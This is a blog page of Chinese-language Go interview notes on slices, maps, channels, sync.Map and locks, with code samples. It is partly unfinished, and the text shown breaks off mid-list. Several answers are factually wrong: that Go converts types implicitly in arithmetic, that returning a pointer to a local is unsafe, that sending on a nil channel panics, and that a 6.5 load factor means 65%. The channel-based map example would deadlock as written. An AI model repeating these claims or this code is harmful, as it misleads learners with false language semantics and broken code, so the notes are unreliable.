runtime的程序计数器，为什么是私有的（为什么程序猿不能操作）</h2><ul><li><p>在 Go 的 runtime 中，程序计数器用于跟踪当前 Goroutine 正在执行的代码位置，从而支持 Goroutine 的并发执行。</p></li><li><p>在单线程情况下，程序计数器会指向当前 Goroutine 执行的代码块。当发生 Goroutine 切换时，程序计数器的值会保存到当前 Goroutine 的上下文中，然后加载新 Goroutine 的上下文中的程序计数器值，以便从上次中断的地方继续执行。</p></li><li><p>避免混乱，保护Groutine在并发环境下的完整性</p></li></ul><h2 id="423-interface和nil可以比较吗【可以】"><a href="#423-interface和nil可以比较吗【可以】" class="headerlink" title="423. interface和nil可以比较吗【可以】"></a>423. interface和nil可以比较吗【可以】</h2><p>但是必须要类型和值都相同</p><ul><li>果接口变量的动态值和动态类型同时都为 nil，那么接口变量将与 nil 比较相等。</li><li>如果类型和值有一个不为nil，那么就是不相等</li></ul><h2 id="447-struct组合与java继承有什么区别"><a href="#447-struct组合与java继承有什么区别" class="headerlink" title="447. struct组合与java继承有什么区别"></a>447. struct组合与java继承有什么区别</h2><ul><li>相同点是，都是静态语言，在编译期实现</li><li>go组合支持多继承，java需要extends 父类来继承，只能继承一个</li></ul><h2 id="448-go的强制类型转换与隐式类型转换"><a href="#448-go的强制类型转换与隐式类型转换" class="headerlink" title="448. go的强制类型转换与隐式类型转换"></a>448. go的强制类型转换与隐式类型转换</h2><p>Go 支持两种类型转换：</p><ul><li><code>var a int = 10，var b float64 = float64(a)</code> 将整数 a 转换为浮点数。</li><li>在算术表达式中，如果操作符两侧的类型不一致，Go 会自动将其中一个值转换为与另一个值相同的类型。</li></ul><h2 id="451-多个interface间可以存在什么关系"><a href="#451-多个interface间可以存在什么关系" class="headerlink" title="451. 多个interface间可以存在什么关系"></a>451. 多个interface间可以存在什么关系</h2><p>组合，嵌套都可以</p><ul><li>一个接口可以嵌套在另一个接口内部，这种情况下，外部接口会继承内部接口的所有方法</li><li>一个接口可以由多个其他接口组合而成，组合后的接口将具有所有组成接口的方法<h2 id="510-go方法和函数的区别"><a href="#510-go方法和函数的区别" class="headerlink" title="510. go方法和函数的区别"></a>510. go方法和函数的区别</h2>方法是定义了 Receiver 的函数，分为receiver</li><li>Value Receiver，不会修改receiver的内容</li><li>Pointer Receiver，会修改receiver的内容</li></ul><h2 id="512-Go函数返回局部变量的指针是否安全【否】"><a href="#512-Go函数返回局部变量的指针是否安全【否】" class="headerlink" title="512. Go函数返回局部变量的指针是否安全【否】"></a>512. Go函数返回局部变量的指针是否安全【否】</h2><p>可以通过返回值和外部穿参一个在堆上的变量，返回这个变量的指针就安全了，并且能自动给gc掉</p><h2 id="5-Go的GMP模型"><a href="#5-Go的GMP模型" class="headerlink" title="5.Go的GMP模型"></a>5.Go的GMP模型</h2><h2 id="6-Go和Java相比"><a href="#6-Go和Java相比" class="headerlink" title="6.Go和Java相比"></a>6.Go和Java相比</h2><h2 id="9-同一个goroutine里面，对无缓冲channel同时发送和接收数据有什么问题"><a href="#9-同一个goroutine里面，对无缓冲channel同时发送和接收数据有什么问题" class="headerlink" title="9.同一个goroutine里面，对无缓冲channel同时发送和接收数据有什么问题"></a>9.同一个goroutine里面，对无缓冲channel同时发送和接收数据有什么问题</h2><p>导致死锁</p><h2 id="10-channel和锁的对比"><a href="#10-channel和锁的对比" class="headerlink" title="10.channel和锁的对比"></a>10.channel和锁的对比</h2><h2 id="11-channel的应用场景"><a href="#11-channel的应用场景" class="headerlink" title="11.channel的应用场景"></a>11.channel的应用场景</h2><h2 id="12"><a href="#12" class="headerlink" title="12."></a>12.</h2><h2 id="227-go实现一个链表"><a href="#227-go实现一个链表" class="headerlink" title="227. go实现一个链表"></a>227. go实现一个链表</h2><h2 id="289-写一个将字符串json转成一个可用的map的函数，json的value类型可能不定"><a href="#289-写一个将字符串json转成一个可用的map的函数，json的value类型可能不定" class="headerlink" title="289. 写一个将字符串json转成一个可用的map的函数，json的value类型可能不定"></a>289. 写一个将字符串json转成一个可用的map的函数，json的value类型可能不定</h2><h1 id="Slice专题"><a href="#Slice专题" class="headerlink" title="Slice专题"></a>Slice专题</h1><h2 id="455-内置cap函数可以用于？【arrary-slice-channel】的capability计算"><a href="#455-内置cap函数可以用于？【arrary-slice-channel】的capability计算" class="headerlink" title="455. 内置cap函数可以用于？【arrary slice channel】的capability计算"></a>455. 内置cap函数可以用于？【arrary slice channel】的capability计算</h2><p>为什么map不能用cap来计算：</p><ul><li>map因为有bucket，在内存存放的大小可能不和make出来的大小一致。是编译器计算后的结果，</li></ul><h2 id="463-切片扩容机制"><a href="#463-切片扩容机制" class="headerlink" title="463. 切片扩容机制"></a>463. 切片扩容机制</h2><p><strong>扩容是为切片分配新的内存空间并复制原切片中元素的过程。</strong><br>先确定新的切片大致容量而分配内存空间，根据该切片当前容量选择不同的策略：<br>【旧】</p><ul><li>如果期望容量大于当前容量的两倍，就会使用期望容量</li><li>如果当前切片的长度小于 1024，容量就会翻倍</li><li>如果当前切片的长达大于 1024，每次扩容 25% 的容量，直到新容量大于期望容量。</li></ul><p>roundupsize 函数来确定待申请的内存，该函数会从一个数组中获取整数，使用这个数组中的元素可以提高内存分配效率并减少碎片，这个数组叫做 NumSizeClasses 。</p><h2 id="520-Slice为什么不是线程安全的"><a href="#520-Slice为什么不是线程安全的" class="headerlink" title="520. Slice为什么不是线程安全的"></a>520. Slice为什么不是线程安全的</h2><p>因为他是引用类型，其他指针可以同时指向底层数组，而且没有同步的措施</p><h2 id="443-slice底层，内存泄漏分析"><a href="#443-slice底层，内存泄漏分析" class="headerlink" title="443. slice底层，内存泄漏分析"></a>443. slice底层，内存泄漏分析</h2><p>1）发生场景：截取长slice中的一段导致长slice未释放。</p><p>由于底层都是数组，如果截图长slice的一段，其实相当于引用了底层数组中的一小段。只要还有引用，golang的gc就不能回收数组。这种情况导致未使用的数组空间，未及时回收。</p><p>​<strong>解决方案</strong>：新建一个长度为0的slice，将需要的一小段slice使用append方法添加到新的slice。再将原来的slice置为nil。</p><p>2）发生场景：没有重置丢失的子切片元素中的指针</p><p>没有及时将不再使用的slice置为nil</p><p>​<strong>解决方案</strong>：如果slice中包含很多元素，再只有一小部分元素需要使用的情况下。建议重新分配一个slice将需要保留的元素加入其中，将原来的长slice整个置为nil。</p><h1 id="Map专题"><a href="#Map专题" class="headerlink" title="Map专题"></a>Map专题</h1><h2 id="32-如何实现一个线程安全的map"><a href="#32-如何实现一个线程安全的map" class="headerlink" title="32. 如何实现一个线程安全的map"></a>32. 如何实现一个线程安全的map</h2><p><a href="https://github.com/guowei-gong/go-demo/blob/main/mutex/demo.go" target="_blank" rel="noopener">https://github.com/guowei-gong/go-demo/blob/main/mutex/demo.go</a></p><ol><li>加读写锁</li><li>分片加锁</li><li>sync.Map（很少用）<ul><li>场景一：只会增长的缓存系统，一个 key 值写入一次而被读很多次；</li><li>场景二：多个 goroutine 为不相交的键读、写和重写键值对。</li></ul></li><li>channel做串行访问:通过将 map 的读写操作发送到一个单独的 Goroutine 中，使得对 map 的访问变成串行的，从而避免了竞态条件。<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line"><span class="keyword">var</span> ch = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="function"><span class="keyword">func</span><span class="params">()</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">read</span><span class="params">(key <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result <span class="keyword">int</span></span><br><span class="line">    ch &lt;- <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        result = m[key]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">write</span><span class="params">(key, val <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    ch &lt;- <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        m[key] = val</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">    value := read(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">println</span>(value) <span class="comment">// 输出 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="34-Map的底层实现"><a href="#34-Map的底层实现" class="headerlink" title="34. Map的底层实现"></a>34. Map的底层实现</h2><p><strong>使用Hash表和搜索树作为底层实现</strong>,底层是一个hmap和一个bmap</p><ul><li>bmap被称之为“桶”。<strong>一个桶里面会最多装 8 个 key</strong>，key 经过哈希计算后，哈希结果是“一类”的将会落入到同一个桶中。在桶内，会根据key计算出来的hash值的高 8 位来决定key到底落入桶内的哪个位置。</li><li>这也是为什么map无法使用cap()来求容量的关键原因：map的容量是编译器进行计算后得出的一个结果，由于桶的存在，map在内存中实际存放的大小不一定同make出来后的map的大小一致。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> hmap <span class="keyword">struct</span> &#123;</span><br><span class="line">    count      <span class="keyword">int</span>            <span class="comment">//元素个数，调用len(map)时直接返回</span></span><br><span class="line">    flags      <span class="keyword">uint8</span>          <span class="comment">//标志map当前状态,正在删除元素、添加元素.....</span></span><br><span class="line">    B          <span class="keyword">uint8</span>          <span class="comment">//单元(buckets)的对数 B=5表示能容纳32个元素</span></span><br><span class="line">    noverflow  <span class="keyword">uint16</span>        <span class="comment">//单元(buckets)溢出数量，如果一个单元能存8个key，此时存储了9个，溢出了，就需要再增加一个单元</span></span><br><span class="line">    hash0      <span class="keyword">uint32</span>         <span class="comment">//哈希种子</span></span><br><span class="line">    buckets    unsafe.Pointer <span class="comment">//指向单元(buckets)数组,大小为2^B，可以为nil</span></span><br><span class="line">    oldbuckets unsafe.Pointer <span class="comment">//扩容的时候，buckets长度会是oldbuckets的两倍</span></span><br><span class="line">    nevacute   <span class="keyword">uintptr</span>        <span class="comment">//指示扩容进度，小于此buckets迁移完成</span></span><br><span class="line">    extra      *mapextra      <span class="comment">//与gc相关 可选字段</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// A bucket for a Go map.</span></span><br><span class="line"><span class="keyword">type</span> bmap <span class="keyword">struct</span> &#123;</span><br><span class="line">tophash [bucketCnt]<span class="keyword">uint8</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实际上编译期间会生成一个新的数据结构</span></span><br><span class="line"><span class="keyword">type</span> bmap <span class="keyword">struct</span> &#123;</span><br><span class="line">    topbits  [<span class="number">8</span>]<span class="keyword">uint8</span></span><br><span class="line">    keys     [<span class="number">8</span>]keytype</span><br><span class="line">    values   [<span class="number">8</span>]valuetype</span><br><span class="line">    pad      <span class="keyword">uintptr</span></span><br><span class="line">    overflow <span class="keyword">uintptr</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/gomapbuckets.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="36-map的key可以是哪些类型，可以是nil吗？可以嵌套吗"><a href="#36-map的key可以是哪些类型，可以是nil吗？可以嵌套吗" class="headerlink" title="36. map的key可以是哪些类型，可以是nil吗？可以嵌套吗"></a>36. map的key可以是哪些类型，可以是nil吗？可以嵌套吗</h2><ul><li>可以作为 map 的键的类型必须<strong>满足相等性比较的条件</strong>，包括基本数据类型和一些自定义类型，string必然可以</li><li>不可以做key的类型：切片，函数，包含切片和函数的符合类型</li></ul><h2 id="36-struct-interface-nil可以做map的key吗"><a href="#36-struct-interface-nil可以做map的key吗" class="headerlink" title="36. struct{} interface{} nil可以做map的key吗"></a>36. struct{} interface{} nil可以做map的key吗</h2><ul><li>nil不可以，其他的可以</li><li>struct{} 以值的字面量形式去比较</li><li>interface{} 以动态类型去比较</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line">m[<span class="number">1</span>] = <span class="number">10</span></span><br><span class="line">m[<span class="string">"string"</span>] = <span class="number">20</span></span><br><span class="line">m[<span class="number">3.14</span>] = <span class="number">30</span></span><br><span class="line">fmt.Println(m[<span class="number">1</span>])       <span class="comment">// 输出 10</span></span><br><span class="line">fmt.Println(m[<span class="string">"string"</span>]) <span class="comment">// 输出 20</span></span><br><span class="line">fmt.Println(m[<span class="number">3.14</span>])    <span class="comment">// 输出 30</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">struct</span>&#123;&#125;]<span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line">key1 := <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">key2 := <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">m[key1] = <span class="number">10</span></span><br><span class="line">m[key2] = <span class="number">20</span></span><br><span class="line">fmt.Println(m[key1]) <span class="comment">// 输出 10</span></span><br><span class="line">fmt.Println(m[key2]) <span class="comment">// 输出 20</span></span><br></pre></td></tr></table></figure><h2 id="251-sync-Map-怎么解决线程安全问题？源码看过吗"><a href="#251-sync-Map-怎么解决线程安全问题？源码看过吗" class="headerlink" title="251. sync.Map 怎么解决线程安全问题？源码看过吗"></a>251. sync.Map 怎么解决线程安全问题？源码看过吗</h2><p>支持并发读写，采取了 “空间换时间” 的机制，冗余了两个数据结构，分别是：read 和 dirty. </p><ul><li><p>优点是读多写少场景下使用，比如只会增长的缓存。</p></li><li><p>缺点是写多场景下，导致 read map 缓存失效，需要加锁，冲突变多，性能急剧下降</p></li><li><p>和原始map+RWLock的实现并发的方式相比，减少了加锁对性能的影响。它做了一些优化：可以无锁访问read map，而且会优先操作read map，倘若只操作read map就可以满足要求，那就不用去操作write map(dirty)，所以在某些特定场景中它发生锁竞争的频率会远远小于map+RWLock的实现方式</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Map <span class="keyword">struct</span> &#123;</span><br><span class="line">    mu Mutex</span><br><span class="line">    read atomic.Value <span class="comment">// readOnly</span></span><br><span class="line">    dirty <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]*entry</span><br><span class="line">    misses <span class="keyword">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="275-map的分段锁拆了几个分片？"><a href="#275-map的分段锁拆了几个分片？" class="headerlink" title="275 map的分段锁拆了几个分片？"></a>275 map的分段锁拆了几个分片？</h2><h2 id="379-如果一个map没申请空间，去向里面取值【发生panic】"><a href="#379-如果一个map没申请空间，去向里面取值【发生panic】" class="headerlink" title="379. 如果一个map没申请空间，去向里面取值【发生panic】"></a>379. 如果一个map没申请空间，去向里面取值【发生panic】</h2><p>一般用的时候就给他make一个</p><h2 id="407-map取一个key，然后修改这个值，原来的数据会发生变化吗？【会】引用类型，"><a href="#407-map取一个key，然后修改这个值，原来的数据会发生变化吗？【会】引用类型，" class="headerlink" title="407. map取一个key，然后修改这个值，原来的数据会发生变化吗？【会】引用类型，"></a>407. map取一个key，然后修改这个值，原来的数据会发生变化吗？【会】引用类型，</h2><h2 id="526-map的负载因子是多少【6-5】为什么？"><a href="#526-map的负载因子是多少【6-5】为什么？" class="headerlink" title="526. map的负载因子是多少【6.5】为什么？"></a>526. map的负载因子是多少【6.5】为什么？</h2><p>默认当 map 中的元素个数达到总容量的 65% 时，会触发扩容操作。<br>为什么？</p><h1 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h1><h2 id="9-同一个协程里面，对无缓冲channel同时进行读写会发生什么问题"><a href="#9-同一个协程里面，对无缓冲channel同时进行读写会发生什么问题" class="headerlink" title="9.同一个协程里面，对无缓冲channel同时进行读写会发生什么问题"></a>9.同一个协程里面，对无缓冲channel同时进行读写会发生什么问题</h2><p>原则上不可以这样写，会导致死锁。</p><p>对于一个无缓冲的channel而言，只有不同的协程之间一方发送数据一方接受数据才不会阻塞。channel无缓冲时，发送阻塞直到数据被接收，接收阻塞直到读到数据。</p><h2 id="14-向为nil的channel发送数据会怎样【发生panic】为什么"><a href="#14-向为nil的channel发送数据会怎样【发生panic】为什么" class="headerlink" title="14.向为nil的channel发送数据会怎样【发生panic】为什么"></a>14.向为nil的channel发送数据会怎样【发生panic】为什么</h2><h2 id="连续两次close-ch-会发生panic-runtime-err"><a href="#连续两次close-ch-会发生panic-runtime-err" class="headerlink" title="连续两次close(ch)会发生panic: runtime err"></a>连续两次close(ch)会发生panic: runtime err</h2><h2 id="51-channel-线程安全吗【安全】里面有互斥锁"><a href="#51-channel-线程安全吗【安全】里面有互斥锁" class="headerlink" title="51. channel 线程安全吗【安全】里面有互斥锁"></a>51. channel 线程安全吗【安全】里面有互斥锁</h2><p><strong>互斥锁是如何起作用的</strong>：<br>在对循环数组buf中的数据进行入队和出队操作时，必须先获取互斥锁，才能操作channel数据。</p><h2 id="98-99-分布式锁有哪些？如何用channel实现？"><a href="#98-99-分布式锁有哪些？如何用channel实现？" class="headerlink" title="98/99. 分布式锁有哪些？如何用channel实现？"></a>98/99. 分布式锁有哪些？如何用channel实现？</h2><p><strong>基于数据库的分布式锁</strong></p><p>使用数据库的事务特性来实现分布式锁，通过在数据库中创建一个唯一索引或者唯一约束来保证锁的唯一性。</p><p><strong>基于Redis的分布式锁</strong></p><p>使用 Redis 提供的 SETNX（SET if Not eXists）指令，可以在 Redis 中创建一个分布式锁。</p><p><strong>基于ZooKeeper的分布式锁</strong></p><p>使用 ZooKeeper 提供的临时有序节点和监视机制，可以实现分布式锁。</p><p><strong>基于etcd的分布式锁</strong></p><p>使用 etcd 提供的分布式锁实现，可以实现分布式系统中的互斥访问。</p><p><strong>基于Go语言的channel实现</strong></p><p>使用 Go 语言的 channel 作为同步机制，在分布式环境下也可以实现互斥访问</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">lockCh = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">1</span>) <span class="comment">// 带缓冲的 channel，容量为1表示只能同时有一个 Goroutine 获取到锁</span></span><br><span class="line">locked = <span class="literal">false</span>                 <span class="comment">// 标记是否已经获取到锁</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">acquireLock</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> lockCh &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;:</span><br><span class="line">locked = <span class="literal">true</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">releaseLock</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> locked &#123;</span><br><span class="line">&lt;-lockCh</span><br><span class="line">locked = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> acquireLock() &#123;</span><br><span class="line"><span class="keyword">defer</span> releaseLock()</span><br><span class="line"><span class="comment">// 临界区代码</span></span><br><span class="line">fmt.Println(<span class="string">"Lock acquired!"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"Failed to acquire lock"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="174-go-里的-syncLock-和-channel-的性能区别"><a href="#174-go-里的-syncLock-和-channel-的性能区别" class="headerlink" title="174. go 里的 syncLock 和 channel 的性能区别"></a>174. go 里的 syncLock 和 channel 的性能区别</h2><h2 id="134-channel实现一个排序算法"><a href="#134-channel实现一个排序算法" class="headerlink" title="134. channel实现一个排序算法"></a>134. channel实现一个排序算法</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bubbleSort</span><span class="params">(nums []<span class="keyword">int</span>, ch <span class="keyword">chan</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">n := <span class="built_in">len</span>(nums)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++ &#123;</span><br><span class="line">swapped := <span class="literal">false</span></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; n-i<span class="number">-1</span>; j++ &#123;</span><br><span class="line"><span class="keyword">if</span> nums[j] &gt; nums[j+<span class="number">1</span>] &#123;</span><br><span class="line">nums[j], nums[j+<span class="number">1</span>] = nums[j+<span class="number">1</span>], nums[j]</span><br><span class="line">swapped = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !swapped &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ch &lt;- <span class="number">1</span> <span class="comment">// 排序完成，向通道发送信号</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">nums := []<span class="keyword">int</span>&#123;<span class="number">4</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> bubbleSort(nums[:<span class="built_in">len</span>(nums)/<span class="number">2</span>], ch) <span class="comment">// 在一个 Goroutine 中排序前半部分</span></span><br><span class="line"><span class="keyword">go</span> bubbleSort(nums[<span class="built_in">len</span>(nums)/<span class="number">2</span>:], ch) <span class="comment">// 在另一个 Goroutine 中排序后半部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待两个 Goroutine 完成</span></span><br><span class="line">&lt;-ch</span><br><span class="line">&lt;-ch</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并两个有序数组</span></span><br><span class="line">merged := merge(nums[:<span class="built_in">len</span>(nums)/<span class="number">2</span>], nums[<span class="built_in">len</span>(nums)/<span class="number">2</span>:])</span><br><span class="line">fmt.Println(merged)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">merge</span><span class="params">(left, right []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">result := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="built_in">len</span>(left)+<span class="built_in">len</span>(right))</span><br><span class="line">i, j, k := <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i &lt; <span class="built_in">len</span>(left) &amp;&amp; j &lt; <span class="built_in">len</span>(right) &#123;</span><br><span class="line"><span class="keyword">if</span> left[i] &lt;= right[j] &#123;</span><br><span class="line">result[k] = left[i]</span><br><span class="line">i++</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">result[k] = right[j]</span><br><span class="line">j++</span><br><span class="line">&#125;</span><br><span class="line">k++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i &lt; <span class="built_in">len</span>(left) &#123;</span><br><span class="line">result[k] = left[i]</span><br><span class="line">i++</span><br><span class="line">k++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> j &lt; <span class="built_in">len</span>(right) &#123;</span><br><span class="line">result[k] = right[j]</span><br><span class="line">j++</span><br><span class="line">k++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="202-channel-实现一个限流器"><a href="#202-channel-实现一个限流器" class="headerlink" title="202. channel 实现一个限流器"></a>202. channel 实现一个限流器</h2><h2 id="473-channel的ring-buffer"><a href="#473-channel的ring-buffer" class="headerlink" title="473. channel的ring buffer"></a>473. channel的ring buffer</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/gochannelringbuffer.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>适用FIFO，recvx 指向最早被读取的数 据，sendx 指向再次写入时插入的位置</p><h1 id="go的同步库"><a href="#go的同步库" class="headerlink" title="go的同步库"></a>go的同步库</h1><h2 id="15-sync-waitgroup的坑"><a href="#15-sync-waitgroup的坑" class="headerlink" title="15. sync.waitgroup的坑"></a>15. sync.waitgroup的坑</h2><p>① Add一个负数</p><p>如果计数器的值小于0会直接panic</p><p>② Add在Wait之后调用</p><p>比如一些子协程开头调用Add结束调用Wait，这些 Wait无法阻塞子协程。正确做法是在开启子协程之前先Add特定的值。</p><p>③ 